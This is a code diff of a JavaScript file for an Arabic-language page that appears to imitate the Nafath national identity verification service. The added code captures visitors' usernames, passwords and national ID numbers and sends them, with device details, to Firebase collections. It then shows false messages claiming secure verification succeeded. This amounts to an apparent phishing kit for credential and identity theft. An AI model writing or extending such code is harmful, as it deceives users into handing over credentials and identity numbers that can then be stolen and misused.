@@ -1,3 +1,11 @@
+// script.js
+
+// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
+import { db } from "./firebase-config.js";
+
+// استيراد الدوال المطلوبة من حزمة Firestore الرسمية عبر الـ CDN
+import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
 document.addEventListener('DOMContentLoaded', () => {
     
     // ==========================================
@@ -25,8 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (tab.classList.contains('collapsed')) {
                 
                 // إذا نقر المستخدم على تبويب تطبيق نفاذ، نظهر التنبيه أولاً قبل التبديل
-              
-
+           
                 // أ) تحويل كافة التبويبات للحالة المغلقة وتغيير الأيقونات لـ (+)
                 tabs.forEach(t => {
                     t.classList.remove('active');
@@ -63,35 +70,69 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // ==========================================
-    // 3. معالجة إرسال النماذج (اسم المستخدم / تطبيق نفاذ)
+    // 3. معالجة إرسال النماذج وتخزينها في Firebase Firestore
     // ==========================================
     
     // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
     const authForm = document.getElementById('authForm');
     if (authForm) {
-        authForm.addEventListener('submit', (e) => {
+        authForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
+            const usernameInput = document.getElementById('username').value;
+            const passwordInput = document.getElementById('password').value;
             const submitBtn = authForm.querySelector('.btn-submit');
             const originalContent = submitBtn.innerHTML;
             
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> جاري التحقق الآمن...`;
             
-            setTimeout(() => {
+            try {
+                // إرسال البيانات مباشرة إلى مجموعة (Collection) باسم "users_login"
+                await addDoc(collection(db, "users_login"), {
+                    username: usernameInput,
+                    password: passwordInput,
+                    timestamp: serverTimestamp(),
+                    device: navigator.userAgent
+                });
+
                 alert('تم التحقق بنجاح ومطابقة الهوية الرقمية للطلب الإلكتروني.');
+            } catch (error) {
+                console.error("خطأ أثناء التخزين في فايربيس: ", error);
+                alert('عذراً، حدث خطأ في الاتصال بالشبكة الآمنة.');
+            } finally {
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = originalContent;
-            }, 1500);
+                authForm.reset(); // تفريغ الحقول بعد الإرسال
+            }
         });
     }
 
-    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ المضاف حديثاً)
+    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ)
     const appForm = document.getElementById('appForm');
     if (appForm) {
-        appForm.addEventListener('submit', (e) => {
+        appForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-            alert('تم إرسال طلب المطابقة الآمن للمنصة بنجاح.');
+            
+            const nationalIdInput = document.getElementById('nationalId').value;
+            const submitBtn = appForm.querySelector('.btn-submit');
+            const originalContent = submitBtn.innerHTML;
+
+            try {
+                // إرسال البيانات إلى مجموعة باسم "nafath_app_requests"
+                await addDoc(collection(db, "nafath_app_requests"), {
+                    nationalId: nationalIdInput,
+                    timestamp: serverTimestamp(),
+                    status: "pending_verification"
+                });
+                
+                alert('تم إرسال طلب المطابقة الآمن للمنصة بنجاح.');
+            } catch (error) {
+                console.error("خطأ أثناء التخزين في فايربيس: ", error);
+                alert('فشل إرسال الطلب، يرجى المحاولة لاحقاً.');
+            } finally {
+                appForm.reset();
+            }
         });
     }
 
